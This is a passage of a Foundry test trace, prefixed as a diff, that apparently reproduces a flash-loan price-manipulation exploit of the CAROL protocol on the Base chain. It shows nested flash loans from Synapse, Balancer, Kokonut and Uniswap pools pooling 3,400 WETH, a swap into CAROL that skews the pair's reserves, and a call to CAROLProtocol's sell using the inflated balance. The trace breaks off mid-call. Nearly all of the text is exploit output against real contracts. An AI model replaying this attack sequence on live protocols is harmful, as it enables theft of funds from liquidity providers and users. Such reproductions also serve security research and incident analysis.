+    │   │   ├─ [3001] WETH::transfer(0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 27299999999999999 [2.729e16])
+    │   │   │   ├─ emit Transfer(from: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 27299999999999999 [2.729e16])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0x0000000000000000000000000000000000000000000000000060fd34925e3fff → 0
+    │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x000000000000000000000000000000000000000000000002ce919ff8657438d1 → 0x000000000000000000000000000000000000000000000002cef29d2cf7d278d0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [32170] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::mint(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685])
+    │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   └─ ← [Return] 51805642280058124496 [5.18e19]
+    │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   └─ ← [Return] 15835374312611974831091951 [1.583e25]
+    │   │   │   ├─ [314] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::feeTo() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], value: 14927406162016718417 [1.492e19])
+    │   │   │   ├─ emit Sync(reserve0: 51805642280058124496 [5.18e19], reserve1: 15835374312611974831091951 [1.583e25])
+    │   │   │   ├─ emit Mint(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0: 27299999999999999 [2.729e16], amount1: 8344761298340607656216 [8.344e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xc960b16574e6a744e218eb8dfcd4ffbde2f00db7cf526a61338bc37fa09f430c: 0x0000000000000000000000000000000000000000000005f43c75e5655e446eb2 → 0x0000000000000000000000000000000000000000000005f50b9eb23627403d03
+    │   │   │   │   @ 8: 0x65677ee30000000d1780fdbdbb50e3ebafd7000000000002ce919ff8657438d1 → 0x65677ee30000000d19455c9157b76f4f30ef000000000002cef29d2cf7d278d0
+    │   │   │   │   @ 11: 0x0000000000000000000000000024bf5e4606ee9a119810483cc2c359224d9687 → 0x0000000000000000000000000024c94a77fdb54147111d808ea0f4784c55ca30
+    │   │   │   │   @ 0: 0x0000000000000000000000000000000000000000000005fecb4a6ed30e857ef7 → 0x0000000000000000000000000000000000000000000005ff9a733ba3d7814d48
+    │   │   │   └─ ← [Return] 14927406162016718417 [1.492e19]
+    │   │   ├─ [55] CAROLProtocol::fallback{value: 1}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 8344761298340607656216 [8.344e21], 27299999999999999 [2.729e16], 14927406162016718417 [1.492e19]
+    │   ├─ emit LiquidityAdded(: 8344761298340607656216 [8.344e21], : 27299999999999999 [2.729e16], : 14927406162016718417 [1.492e19], : 1701281507 [1.701e9])
+    │   ├─  emit topic 0: 0x7f031f4b63b7e30025819429e088c213369d52d8e26d6122f33611732569e859
+    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │           data: 0x0000000000000000000000000000000000000000000002863e52df6debb2b86b000000000000000000000000000000000000000000000000008a8e4b1a3d80000000000000000000000000000000000000000000000000000000000065677ee3
+    │   ├─  storage changes:
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c413: 9144 → 9145
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe48: 0 → 0x00000000000000000000000000000000000000000000050c7ca5bedbd76570d6
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c408: 0x000000000000000000000000000000000000000000000004d12208b047bbf6c7 → 0x000000000000000000000000000000000000000000000004d13dbebf4cfb76c7
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe49: 0 → 0x0000000000000000000000000000000000000000000000000000000065677ee3
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe4a: 0 → 0x0000000000000000000000000000000000000000000000000000000065677ee3
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c414: 9174 → 9175
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40a: 0x0000000000000000000000000000000000000000000000a9f938713a070a1c1e → 0x0000000000000000000000000000000000000000000000a9fbed38b18a3d9c1e
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c416: 9192 → 9193
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40e: 5229 → 5230
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c411: 9035 → 9036
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40f: 8228 → 8229
+    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc99: 0 → 0x000000000000000000000000000000000000000000000000008a8e4b1a3d8000
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c410: 8979 → 8980
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe4c: 0 → 0x000000000000000000000000000000000000000000000792baf89e49c3182941
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c412: 9060 → 9061
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c415: 9183 → 9184
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40d: 1511 → 1512
+    │   └─ ← [Stop]
+    ├─ [0] VM::roll(7279799 [7.279e6])
+    │   └─ ← [Return]
+    ├─ [0] VM::warp(1701348645 [1.701e9])
+    │   └─ ← [Return]
+    ├─ [2457] WETH::balanceOf(SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f]) [staticcall]
+    │   └─ ← [Return] 1292165339432938199077 [1.292e21]
+    ├─ [1261891] SynapseETHPools::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0x4200000000000000000000000000000000000006], 1292165339432938199077 [1.292e21], 0x)
+    │   ├─ [1259198] 0x9508BF380c1e6f751D97604732eF1Bae6673f299::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0x4200000000000000000000000000000000000006], 1292165339432938199077 [1.292e21], 0x) [delegatecall]
+    │   │   ├─ [457] WETH::balanceOf(SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f]) [staticcall]
+    │   │   │   └─ ← [Return] 1292165339432938199077 [1.292e21]
+    │   │   ├─ [27701] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1292165339432938199077 [1.292e21])
+    │   │   │   ├─ emit Transfer(from: SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1292165339432938199077 [1.292e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x12e07608ed4c056b230f2aa83f8aadc4588ddc3981f0205b25ddba2d1ad79e34: 0x0000000000000000000000000000000000000000000000460c657a0764555825 → 0
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000460c657a0764555825
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1200186] ContractTest::executeOperation(SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f], WETH: [0x4200000000000000000000000000000000000006], 1292165339432938199077 [1.292e21], 1033732271546350559 [1.033e18], 0x)
+    │   │   │   ├─ [2457] WETH::balanceOf(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   │   │   └─ ← [Return] 824240035672384091573 [8.242e20]
+    │   │   │   ├─ [1186577] BalancerVault::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0x4200000000000000000000000000000000000006], [824240035672384091573 [8.242e20]], 0x)
+    │   │   │   │   ├─ [457] WETH::balanceOf(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 824240035672384091573 [8.242e20]
+    │   │   │   │   ├─ [2350] ProtocolFeesCollector::getFlashLoanFeePercentage() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [5801] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 824240035672384091573 [8.242e20])
+    │   │   │   │   │   ├─ emit Transfer(from: BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 824240035672384091573 [8.242e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000460c657a0764555825 → 0x000000000000000000000000000000000000000000000072bb06537648158dda
+    │   │   │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x00000000000000000000000000000000000000000000002caea0d96ee3c035b5 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1159583] ContractTest::receiveFlashLoan([0x4200000000000000000000000000000000000006], [824240035672384091573 [8.242e20]], [0], 0x)
+    │   │   │   │   │   ├─ [2457] WETH::balanceOf(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 323601903726827828360 [3.236e20]
+    │   │   │   │   │   ├─ [1144306] Kokonut::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0, 323601903726827828360 [3.236e20]], 0x)
+    │   │   │   │   │   │   ├─ [7545] 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA::balanceOf(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2559] 0x1833C6171E0A3389B156eAedB301CFfbf328B463::balanceOf(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 671024918530 [6.71e11]
+    │   │   │   │   │   │   │   └─ ← [Return] 671024918530 [6.71e11]
+    │   │   │   │   │   │   ├─ [457] WETH::balanceOf(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 323601903726827828360 [3.236e20]
+    │   │   │   │   │   │   ├─ [5801] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 323601903726827828360 [3.236e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 323601903726827828360 [3.236e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xcb5f509312985b15d8d664d057cc1fa800b361b5a6c874c23961b64a976935c7: 0x0000000000000000000000000000000000000000000000118ae0e8ec55ba7488 → 0
+    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000072bb06537648158dda → 0x00000000000000000000000000000000000000000000008445e73c629dd00262
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [919189] ContractTest::onFlashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0, 323601903726827828360 [3.236e20]], [0, 161800951863413915 [1.618e17]], 0x)
+    │   │   │   │   │   │   │   ├─ [2457] WETH::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 339247662569723970279 [3.392e20]
+    │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 339247662569723970279 [3.392e20]
+    │   │   │   │   │   │   │   ├─ [905536] WETH_USDbCV3::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 339247662569723970279 [3.392e20], 0, 0x0000000000000000000000000000000000000000000000126401cfb22dfac2e7)
+    │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 339247662569723970279 [3.392e20]
+    │   │   │   │   │   │   │   │   ├─ [3045] 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [2559] 0x1833C6171E0A3389B156eAedB301CFfbf328B463::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1162130361162 [1.162e12]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1162130361162 [1.162e12]
+    │   │   │   │   │   │   │   │   ├─ [5801] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 339247662569723970279 [3.392e20])
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 339247662569723970279 [3.392e20])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000008445e73c629dd00262 → 0x000000000000000000000000000000000000000000000096a9e90c14cbcac549
+    │   │   │   │   │   │   │   │   │   │   @ 0xfa61d2f40d051e8dd57e20114f1225baf887f01db04f4c593282c488891cddc2: 0x0000000000000000000000000000000000000000000000126401cfb22dfac2e7 → 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   ├─ [872508] ContractTest::uniswapV3FlashCallback(169623831284861986 [1.696e17], 0, 0x0000000000000000000000000000000000000000000000126401cfb22dfac2e7)
+    │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2779254941401874089289 [2.779e21]
+    │   │   │   │   │   │   │   │   │   ├─ [861841] WETH_USDbCV2::swap(620745058598125910711 [6.207e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01)
+    │   │   │   │   │   │   │   │   │   │   ├─ [859142] 0xA4e46b4f701c62e14DF11B48dCe76A7d793CD6d7::swap(620745058598125910711 [6.207e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [2421] 0x420DD381b31aEf6683db6B902084cB0FFECe40Da::isPaused() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [7801] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 620745058598125910711 [6.207e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 620745058598125910711 [6.207e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000096a9e90c14cbcac549 → 0x0000000000000000000000000000000000000000000000b8507a820728200000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xc93772cfdf83c0f79f83c7206cf8109722a0e3b1bd40e76acb3b284626ac2c81: 0x0000000000000000000000000000000000000000000000bc41fbc31de02d7e94 → 0x00000000000000000000000000000000000000000000009a9b6a4d2b83d843dd
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [689877] ContractTest::hook(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 620745058598125910711 [6.207e20], 0, 0x01)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3400000000000000000000 [3.4e21]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit log_named_decimal_uint(key: "WETH amount after flashloans", val: 3400000000000000000000 [3.4e21], decimals: 18)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24399] WETH::approve(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x223809f33a4b18ef7c3b2fcd0eff0e9f7d96a6cb0ddd772b7175067831edc091: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24652] CAROL::approve(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x891b084649e6998c93691645f4bae1ff63f3f6e02271bae4931e2c5897cb399f: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3400000000000000000000 [3.4e21]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [55234] Router::swapExactTokensForTokens(3400000000000000000000 [3.4e21], 0, [0x4200000000000000000000000000000000000006, 0x4A0a76645941d8C7ba059940B3446228F0DB8972], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701352645 [1.701e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 51805642280058124496 [5.18e19], 15835374312611974831091951 [1.583e25], 1701281507 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3264] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 3400000000000000000000 [3.4e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 3400000000000000000000 [3.4e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x000000000000000000000000000000000000000000000002cef29d2cf7d278d0 → 0x0000000000000000000000000000000000000000000000bb1f6d1f341ff278d0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000b8507a820728200000 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [39441] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::swap(0, 15597126006409689141027309 [1.559e25], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [25410] CAROL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15597126006409689141027309 [1.559e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 15597126006409689141027309 [1.559e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x0000000000000000000000000000000000000000000d19455c9157b76f4f30ef → 0x0000000000000000000000000000000000000000000032737770655a65980f02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000ce6d1e520f25d09b721ed
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3451805642280058124496 [3.451e21]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 238248306202285690064642 [2.382e23]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 3451805642280058124496 [3.451e21], reserve1: 238248306202285690064642 [2.382e23])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0In: 3400000000000000000000 [3.4e21], amount1In: 0, amount0Out: 0, amount1Out: 15597126006409689141027309 [1.559e25], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 9: 0x00000000000000000000000000d0ed3788eec4e7a68de73fb9967c1e597448e8 → 0x00000000000000000000000000d5b46c6526724e9bcfd8f341b0c5e3e70246ba
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 10: 0x0000000000000000000000000000000000466ba8eaf7ce4cf52d095bbbbb6ed6 → 0x000000000000000000000000000000000046a3e36effe63647d6cbbf582b8be6
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 0x65677ee30000000d19455c9157b76f4f30ef000000000002cef29d2cf7d278d0 → 0x656885250000000032737770655a65980f020000000000bb1f6d1f341ff278d0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [3400000000000000000000 [3.4e21], 15597126006409689141027309 [1.559e25]]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 15597126006409689141027309 [1.559e25]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [200] CAROL::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit log_named_decimal_uint(key: "CAROL amount after swap from WETH", val: 15597126006409689141027309 [1.559e25], decimals: 18)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [62562] CAROLProtocol::userBalance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2927235194430644552183 [2.927e21]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [455867] CAROLProtocol::sell(2927235194430644552183 [2.927e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
